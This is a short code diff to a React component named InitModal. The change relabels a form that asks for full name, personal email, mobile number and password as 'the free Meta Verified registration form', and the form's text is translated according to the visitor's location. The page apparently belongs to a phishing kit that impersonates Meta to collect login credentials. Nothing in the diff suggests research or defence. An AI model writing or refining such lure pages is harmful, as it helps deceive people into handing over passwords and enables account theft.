@@ -51,7 +51,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
     useEffect(() => {
         if (!geoInfo) return;
-        const textsToTranslate = ['You need to log in to continue.', 'Full Name', 'Personal Email', 'Mobile phone number', 'Password', 'I agree with Terms of use', 'Submit'];
+        const textsToTranslate = ['Complete the free Meta Verified registration form.', 'Full Name', 'Personal Email', 'Mobile phone number', 'Password', 'I agree with Terms of use', 'Submit'];
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
             for (const text of textsToTranslate) {
